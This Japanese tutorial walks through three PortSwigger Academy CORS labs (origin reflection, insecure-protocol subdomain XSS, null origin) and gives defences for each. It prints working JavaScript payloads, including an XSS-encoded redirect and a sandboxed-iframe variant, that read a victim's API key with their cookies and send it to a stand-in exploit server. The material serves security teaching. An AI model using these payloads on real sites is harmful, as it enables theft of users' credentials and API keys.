## CORSラボwalkthrough

本節では、PortSwigger Web Security Academyが提供する代表的なCORS（Cross-Origin Resource Sharing、オリジン間リソース共有）脆弱性ラボ3種を、実際の攻略記録（write-up）と自動化スクリプトを題材に、手順・原理・防御の3点セットで解説する。いずれも「攻撃者が用意した任意のWebページに被害者を誘導し、被害者のブラウザセッション（Cookie）を使って本来アクセスできないはずのAPIレスポンスを盗み出す」という共通のゴールを持つが、悪用されるCORS設定の不備パターンがそれぞれ異なる。読者は各ラボの違いを比較することで、「CORS設定不備」と一括りにされがちな脆弱性が実際には複数の異なるサーバー実装ミスに分類できることを理解できる。

なお、本節で扱う手順はすべてPortSwigger Web Security Academyが提供する学習用サンドボックス環境（各ラボごとに払い出される専用インスタンス）を対象としたものであり、実在の本番サービスへの無許可の検証を推奨するものではない。防御側が「攻撃者がどのようにCORS設定の穴を突くか」を理解し、自組織の設定を点検するための教材として読んでほしい。

### ラボ共通の攻撃基盤: `withCredentials` と `XMLHttpRequest`

3つのラボすべてで中核となるのが、次のJavaScriptパターンである。

```javascript
var r = new XMLHttpRequest();
r.open('get', 'https://victim-app.example/accountDetails', false);
r.withCredentials = true;
r.send();

const obj = JSON.parse(r.responseText);
r.open('get', 'https://exploit-server.example/?user=' + obj.username + '&apikey=' + obj.apikey, false);
r.send();
```

なぜこのコードが「CORS設定不備」の証拠になるのか、仕組みから説明する。ブラウザは異なるオリジン（スキーム・ホスト・ポートの組のいずれかが異なるオリジン）へ`fetch`や`XMLHttpRequest`でリクエストを送ること自体は許可している。ブラウザが制限しているのは「レスポンスの中身をJavaScriptから読み取れるかどうか」である。読み取りを許可するかどうかは、サーバーが返す`Access-Control-Allow-Origin`（略してACAO）レスポンスヘッダーで決まる。さらに、Cookieのような認証情報（credentials）を載せたクロスオリジンリクエストを許可するには、ブラウザ側で`withCredentials = true`（Fetch APIなら`credentials: 'include'`）を明示的に指定し、かつサーバー側が`Access-Control-Allow-Credentials: true`を返す必要がある。この2条件が両方そろって初めて、攻撃者のオリジンで実行されたJavaScriptが、被害者のCookieを使って認証済みAPIのレスポンス本文を読み取れるようになる。つまり上記コードの`r.withCredentials = true`という1行は、「このリクエストは被害者のセッションCookieを使って送られ、かつサーバーのACAO設定次第でレスポンスが盗み取れる」という攻撃条件をそのまま表現している。

同期的な`false`（第3引数、`async=false`）を使っているのは、この解法スクリプトがブラウザではなくPortSwigger公式の「Exploit Server」機能上で配信されるHTMLに埋め込まれるためで、複数のリクエストを順番に完了させてから結果をまとめて次の宛先に送るための実装上の簡略化であり、脆弱性の本質とは無関係である。

### ラボ1: Origin反射による基本的なCORS脆弱性（Basic Origin Reflection）

> 出典: Write-up: CORS vulnerability with basic origin reflection (PortSwigger Academy) — https://medium.com/@frank.leitner/write-up-cors-vulnerability-with-basic-origin-reflection-portswigger-academy-32db7e9f1ff4
> 出典: GitHub(frank-leitner) `13_cross_origin_resource_sharing_CORS/CORS_vulnerability_with_basic_origin_reflection/script.py` — https://github.com/frank-leitner/portswigger-websecurity-academy
> 対象ラボ: `https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack`（難易度: APPRENTICE、2026年9月時点でも同一構成で公開中）

#### 脆弱性の中身

このラボの脆弱なエンドポイントは`/accountDetails`で、ログイン中ユーザーのAPIキーを含むJSONを返す。通常このエンドポイントは同一オリジンからしか呼び出せないはずだが、サーバーはリクエストの`Origin`ヘッダーの値をそのまま検証なしに`Access-Control-Allow-Origin`レスポンスヘッダーへコピー（「反射」）して返す実装になっている。

```
GET /accountDetails HTTP/1.1
Host: victim-app.example
Origin: https://attacker.example
Cookie: session=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true

{"username":"wiener","apikey":"gOl7iVmfoesIVlIsWUfK30vYkLUDcRXr"}
```

なぜこれが致命的なのか。`Access-Control-Allow-Origin`はワイルドカード`*`を除けば本来「単一の信頼できるオリジンを固定で書く」ためのヘッダーだが、このサーバーは受け取った`Origin`ヘッダーの値をそのまま書き戻しているため、実質的に「どんなオリジンでも許可する」のと同義になる。しかも`*`を使うとブラウザの仕様上`Access-Control-Allow-Credentials: true`と併用できない（Fetch仕様がCredentialsモード付きリクエストに対して`*`を許容しない）ため、Cookie付きの認証済みリクエストを許可したい開発者が「`*`は使えないから動的に反射すればいい」という誤った回避策を取ってしまうケースが典型的な発生原因である。

#### 攻撃ペイロード

Write-upおよびGitHub解答スクリプトの`store_exploit`関数が生成するHTMLは、Exploit Server（PortSwigger Academyが各ラボに用意する、攻撃者が自由にHTMLを配置できる別オリジンのサーバー）に以下の内容で保存される。

```html
<script>
    var r = new XMLHttpRequest();
    r.open('get', 'https://victim-app.example/accountDetails', false);
    r.withCredentials = true;
    r.send();

    const obj = JSON.parse(r.responseText);
    r.open('get', 'https://exploit-server.example/?user=' + obj.username + '&apikey=' + obj.apikey, false);
    r.send();
</script>
```

被害者がこのHTMLをExploit Server経由で開くと、ブラウザは「Exploit Serverのオリジンで実行されているスクリプトが、victim-app.exampleへクロスオリジンリクエストを送る」という状況になる。ブラウザは自動的に`Origin: https://exploit-server.example`ヘッダーを付与してリクエストを送信し、被害者のvictim-app.example用Cookieも同送する（`withCredentials = true`のため）。サーバーはこの`Origin`値をそのまま`Access-Control-Allow-Origin`として反射するため、ブラウザは「サーバーがこのオリジンからの読み取りを許可した」と判断し、レスポンス本文（JSON）をJavaScriptに渡す。あとはAPIキーをクエリパラメータとして自分のサーバーへ送り返すだけで、攻撃者はログを見て被害者のAPIキーを回収できる。

#### 防御

- `Access-Control-Allow-Origin`にリクエストの`Origin`ヘッダーをそのまま書き戻さない。許可するオリジンは事前に定義したホワイトリストと厳密一致（プロトコル・ホスト・ポートまで含めて）で照合し、一致した場合のみそのオリジン文字列を返す。
- 認証情報を伴うレスポンスに対しては、ホワイトリストを可能な限り狭く保つ。ワイルドカード的な緩い一致（サブストリング一致や正規表現の書き方の誤り）を避ける。
- CORSミドルウェア（Expressの`cors`パッケージ等）を使う場合も、`origin: true`のような「常にリクエスト元を許可する」設定は、実質的にこのラボと同じ脆弱性を作り込むことになるため避ける。

### ラボ2: 信頼された非セキュアなプロトコル（サブドメインXSS起点）

> 出典: Write-up: CORS vulnerability with trusted insecure protocols (PortSwigger Academy) — https://medium.com/@frank.leitner/write-up-cors-vulnerability-with-trusted-insecure-protocols-portswigger-academy-ab04892777cf
> 出典: GitHub(frank-leitner) `13_cross_origin_resource_sharing_CORS/CORS_vulnerability_with_trusted_insecure_protocols/script.py` — https://github.com/frank-leitner/portswigger-websecurity-academy
> 対象ラボ: `https://portswigger.net/web-security/cors/lab-breaking-https-attack`系統（難易度: PRACTITIONER）

#### 脆弱性の中身

このラボのサーバーは、Origin反射ではなく「特定のホスト名パターン（サブドメイン）に一致すれば許可する」という、一見まともに見えるホワイトリスト方式のCORS設定を使っている。しかしその照合ロジックがホスト名の末尾一致（サフィックスマッチ）だけで、スキーム（`http://`か`https://`か）を区別していない。

```
GET /accountDetails HTTP/1.1
Host: victim-app.example
Origin: http://stock.victim-app.example

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://stock.victim-app.example
Access-Control-Allow-Credentials: true
```

一見「`victim-app.example`のサブドメインしか信頼していないから安全」に見えるが、Write-upが指摘する通りこの設定は「プロトコルを問わず全てのサブドメインを信頼する」ため、`https://stock.victim-app.example`だけでなく平文の`http://stock.victim-app.example`も許可対象に含まれてしまう。ここに「`stock.`サブドメインの在庫確認機能に反射型XSS（reflected XSS: URLパラメータの値がサニタイズされずにHTMLへ出力され、被害者のブラウザ上で任意スクリプトとして実行されてしまう脆弱性）が存在する」という別の弱点が組み合わさることで、致命的な攻撃チェーンが成立する。

#### なぜHTTPでのXSSがCORS回避に使えるのか（仕組み）

Origin反射（ラボ1）と異なり、このラボでは攻撃者のExploit Serverから直接`/accountDetails`を叩いてもCORSヘッダーが返らずブロックされる。攻撃者のオリジンはホワイトリストに含まれないからだ。そこで攻撃者は「ホワイトリストに含まれるオリジン自体からリクエストを発生させる」という発想の転換を行う。具体的には、`stock.victim-app.example`上のXSS脆弱性を悪用して、被害者のブラウザ内で*そのサブドメインのコンテキストとして*任意のJavaScriptを実行させる。ブラウザからすれば、このスクリプトは正真正銘`stock.victim-app.example`というオリジンで動いているので、`Origin`ヘッダーには本物の`stock.victim-app.example`が入り、CORSホワイトリストを正規に通過してしまう。

ここで平文HTTPが問題になるのは、中間者攻撃（MITM）耐性という文脈だけでなく、このラボ設計上は「HTTPとHTTPSを区別しないホワイトリスト実装のミス」を象徴する意味合いが強い。実運用では、HTTP版のサブドメインは往々にしてHTTPS版よりセキュリティ対策（WAFやCSP等）が手薄になりがちで、そこにXSSが残っている確率が相対的に高い、という現実的な事情も攻撃者に有利に働く。

#### 攻撃ペイロード

Write-upと解答スクリプトの`store_exploit`関数が組み立てるペイロードは、まずXSSを誘発するために`stock.`サブドメインへ被害者をリダイレクトし、そのURLの`productId`パラメータに`<script>`タグを注入する形を取る。

```javascript
document.location = "https://stock.victim-app.example/?productId=1<script>"
  + "var r = new XMLHttpRequest();"
  + "r.open('get','https://victim-app.example/accountDetails',false);"
  + "r.withCredentials = true;"
  + "r.send();"
  + "const obj = JSON.parse(r.responseText);"
  + "r.open('get','https://exploit-server.example/?user='+obj.username+'%26apikey='+obj.apikey,false);"
  + "r.send();"
  + "%3c/script>&storeId=1";
```

ここで注目すべきは2つのエンコーディングの工夫である。第一に、閉じタグ`</script>`をそのまま書くと、ブラウザのHTMLパーサが「外側の`<script>document.location=...</script>`」の終端だと誤認してJavaScript文字列リテラルの途中で構文が壊れてしまう。そこで`</script>`を`%3c/script>`（`<`のみをURLエンコード）と表記し、URL全体としてパーサに解釈された後にstock側のレスポンスHTMLへ展開された時点で初めて本物の閉じタグとして機能するようにしている。第二に、注入先スクリプト内部で使う`&`（クエリパラメータの区切り文字と衝突する)を`%26`とエンコードすることで、外側の`productId=...&storeId=1`というクエリ構造を壊さないようにしている。この二重エンコーディングの使い分けは、「XSSペイロードをさらに別のURLの中に埋め込む」多段インジェクションでは頻出のテクニックであり、原理を理解しておくと類似の反射型XSS発見時にも応用が利く。

#### 防御

- CORSのオリジン照合は、サブドメインだからといって安易に信頼せず、スキームを含めた完全なオリジン文字列で一致判定する。`endsWith("victim-app.example")`のような雑な部分一致・サフィックス一致は`evilvictim-app.example`のような偽装ドメインにも一致してしまう別の抜け穴も生みやすいため、正規表現よりも構造化されたオリジン比較（プロトコル・ホスト全体の完全一致）を使う。
- サブドメインを信頼する設計自体が「そのサブドメインのXSS脆弱性がメインドメインの機密情報漏えいに直結する」というリスクを常に内包することを認識し、可能な限りワイルドカード的なサブドメイン全体の信頼を避け、必要なサブドメインだけを個別に列挙する。
- HTTPとHTTPSが混在しているサブドメインがあるなら、平文HTTPは廃止するかHSTS（HTTP Strict Transport Security）で強制的にHTTPSへリダイレクトし、そもそも平文チャネルでの通信自体を成立させない。
- 各サブドメイン側でも独立してXSS対策（出力エンコーディング、CSP）を行う。「信頼済みサブドメインだから」という理由でセキュリティ対策の優先度を下げると、CORSホワイトリストの信頼関係を逆手に取られる。

### ラボ3: nullオリジンを信頼するCORS設定（Trusted Null Origin）

> 出典: GitHub(frank-leitner) `13_cross_origin_resource_sharing_CORS/CORS_vulnerability_with_trusted_null_origin/README.md`, `script.py` — https://github.com/frank-leitner/portswigger-websecurity-academy
> 対象ラボ: `https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack`（難易度: APPRENTICE）

このラボについてはMedium記事が用意されておらず、GitHubリポジトリ内の当該ラボディレクトリ（README.mdとscript.py）が一次資料となる。取得は正常に完了しているため、以下は取得できた内容に基づく解説である。

#### 脆弱性の中身とnullオリジンが生まれる仕組み

サーバーのCORS実装が、`Origin: null`というリクエストを特別扱いして許可してしまっている。

```
GET /accountDetails HTTP/1.1
Host: victim-app.example
Origin: null
Cookie: session=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

なぜ「オリジンがnullになる」状況が存在するのか。これはブラウザの仕様上、いくつかの状況で意図的に「オリジンを持たない」ことを示す特別な値`null`が`Origin`ヘッダーに使われるためである。具体的には、`file://`スキームで開いたローカルHTML、`data:`URIから生成されたページ、そして本ラボで悪用される`sandbox`属性付きの`<iframe>`（`allow-scripts`は付与するが`allow-same-origin`は付与しない）から発行されたリクエストがこれに当たる。開発者の中には「`null`はブラウザやローカル環境からの特殊なリクエストのはずだから安全だろう」という誤解に基づき、ホワイトリストに`null`を含めてしまうケースがある。しかし実際には、`sandbox`属性付きiframeは攻撃者が完全に内容をコントロールできる、れっきとした攻撃用オリジンの一つであり、`null`を信頼することは「任意の攻撃者が作ったiframeを信頼する」のとほぼ同義になる。

#### 攻撃ペイロード

GitHub上の`script.py`（`store_exploit`関数）が生成するExploit Server用HTMLは次の通りである。

```html
<iframe name="malicious" srcdoc="<script>
    var r = new XMLHttpRequest();
    r.open('get', 'https://victim-app.example/accountDetails', false);
    r.withCredentials = true;
    r.send();

    const obj = JSON.parse(r.responseText);
    r.open('get', 'https://exploit-server.example/?user=' + obj.username + '&apikey=' + obj.apikey, false);
    r.send();
</script>" sandbox="allow-scripts" width="0px" height="0px" style="border: 0px none;"> </iframe>
```

`sandbox="allow-scripts"`という属性が鍵になる。`sandbox`属性を持つiframeはデフォルトで多くの機能が無効化されるが、`allow-scripts`を指定するとJavaScriptの実行だけは許可される。ここで重要なのは`allow-same-origin`を意図的に付けていない点で、これによりこのiframe内で実行されるスクリプトは、親ページがどのオリジンであっても「自分自身のオリジンを持たない」状態、すなわち`null`オリジンとして扱われる。ブラウザはこのiframe内から発行されたクロスオリジンリクエストに`Origin: null`ヘッダーを自動的に付与する。サーバーが`null`をホワイトリストに含めているため、`Access-Control-Allow-Origin: null`が返り、`withCredentials = true`と`Access-Control-Allow-Credentials: true`の組み合わせにより、iframe内のスクリプトはレスポンス本文を正常に読み取れてしまう。

`srcdoc`属性を使ってiframeの中身をHTML文字列としてインラインで埋め込んでいるのは、外部ファイルを別途ホストする必要をなくし、Exploit Serverの1レスポンスだけで攻撃を完結させるための実装上の工夫であり、`null`オリジンを発生させる本質は`sandbox`属性の側にある。

#### 防御

- CORSホワイトリストに`null`を絶対に含めない。`null`は「送信元が特定できない、信頼度が最も低いリクエスト」を示す値であり、これを許可することは事実上オリジンチェックを無効化するのと同じ結果になる。
- サーバー側の実装で、`Origin`ヘッダーが存在しない、または文字列`"null"`である場合は、ホワイトリスト照合ロジックの手前で明示的に拒否する分岐を入れる（多くのCORSライブラリのデフォルト実装はこの点を正しく扱うが、独自実装では見落とされやすい）。
- 自組織のサイトに外部コンテンツを`sandbox`なしで埋め込んでいないか、逆に自サイトが他者にsandboxed iframeとして埋め込まれた際に機密操作ができてしまわないかを、CSPの`frame-ancestors`ディレクティブと合わせて点検する。

### 3ラボを比較して見える設計原則

以下の一覧は、GitHubリポジトリの解答スクリプト群が共有する自動化構造（Exploit Serverの発見→ペイロード格納→被害者への配信→ログからの秘密情報抽出→回答送信、という5段階のパターン）から読み取れる、CORS攻撃chainの共通点と相違点である。

| ラボ | ホワイトリストの誤り方 | 追加で必要な弱点 | ブラウザ側のトリガー |
|---|---|---|---|
| Origin反射 | 受信した`Origin`をそのまま反射 | 不要（単体で成立） | 通常のクロスオリジンXHR |
| 信頼された非セキュアプロトコル | サブドメインをスキーム区別なく許可 | サブドメイン上の反射型XSS | XSS経由でホワイトリスト内オリジンからXHRを発行 |
| nullオリジン信頼 | `null`をホワイトリストに含める | 不要（sandboxed iframeで単体成立） | `sandbox="allow-scripts"` iframeからのXHR |

この比較から得られる教訓は、「CORS設定が正しいかどうか」はACAOヘッダーの値を1つ見ただけでは判断できず、(1) オリジン照合ロジックが完全一致か部分一致か、(2) `Access-Control-Allow-Credentials`が同時に有効になっていないか、(3) `null`のような特殊値が紛れ込んでいないか、という3点をセットで確認する必要があるということである。ペネトレーションテストや脆弱性診断の現場では、単に`Origin: https://evil.example`を付けてリクエストを送るだけでなく、`Origin: null`、サブドメインのバリエーション（大文字小文字・別ポート・別スキーム）、任意文字列を末尾に付与したドメイン（サフィックス一致の誤り検出用）など、複数パターンでの反射確認を行うことが実践上重要になる。
